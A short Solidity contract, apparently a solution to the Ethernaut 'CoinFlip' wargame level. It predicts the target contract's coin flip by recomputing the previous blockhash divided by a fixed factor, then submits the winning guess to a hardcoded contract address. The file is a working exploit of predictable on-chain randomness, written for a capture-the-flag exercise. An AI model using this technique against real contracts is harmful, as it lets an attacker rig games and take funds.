pragma solidity ^0.8.7;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract solveCoinFlip {
    CoinFlip public originalContract = CoinFlip(0x49F294A10B164aBB6F54Dff08CDEf5651c814c5b);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function solveFlip(bool _guess) public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            originalContract.flip(_guess);
        } else {
            originalContract.flip(!_guess);
        }
    }
}
